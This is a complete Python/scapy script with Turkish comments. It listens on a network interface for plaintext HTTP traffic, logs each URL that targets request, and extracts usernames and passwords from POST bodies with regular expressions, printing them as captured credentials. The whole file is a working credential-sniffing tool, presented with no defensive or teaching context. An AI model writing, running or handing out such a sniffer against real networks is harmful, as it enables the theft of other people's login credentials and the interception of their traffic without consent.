from scapy.all import *
from scapy.layers.http import HTTPRequest  # HTTP isteklerini analiz etmek icin
import re

# Arayuzu belirtelim (genellikle eth0 veya wlan0 olur)
INTERFACE = "eth0"

# Kullanici adi ve sifreyi yakalamak icin regex desenleri
USERNAME_REGEX = re.compile(r".*(username|user|login|email)[^=]*=([^&]+)", re.IGNORECASE)
PASSWORD_REGEX = re.compile(r".*(password|pass|pwd)[^=]*=([^&]+)", re.IGNORECASE)

def packet_callback(packet):
    # Sadece HTTP istegi iceren paketleri incele
    if packet.haslayer(HTTPRequest):
        http_layer = packet[HTTPRequest]
        ip_layer = packet[IP]

        # Hedefin gittigi URL'yi yazdir
        url = f"http://{http_layer.Host.decode()}{http_layer.Path.decode()}"
        print(f"[+] HTTP Istegi: {ip_layer.src} -> {url}")

        # Eger paket bir POST istegi iceriyorsa icerigi yakala
        if packet.haslayer(Raw):
            load = packet[Raw].load.decode(errors='ignore')
            
            # Kullanici adi ve sifreleri arayalim
            username_match = USERNAME_REGEX.search(load)
            password_match = PASSWORD_REGEX.search(load)
            
            if username_match or password_match:
                print("\n[***] Kullanici Bilgisi Yakalandı!")
                if username_match:
                    print(f"Kullanici Adi: {username_match.group(2)}")
                if password_match:
                    print(f"Sifre: {password_match.group(2)}")
                print("\n")

# Paketleri dinlemeye basla
print(f"[+] {INTERFACE} arayuzu uzerinden HTTP trafiği dinleniyor...")
sniff(iface=INTERFACE, prn=packet_callback, store=0, filter="tcp port 80")
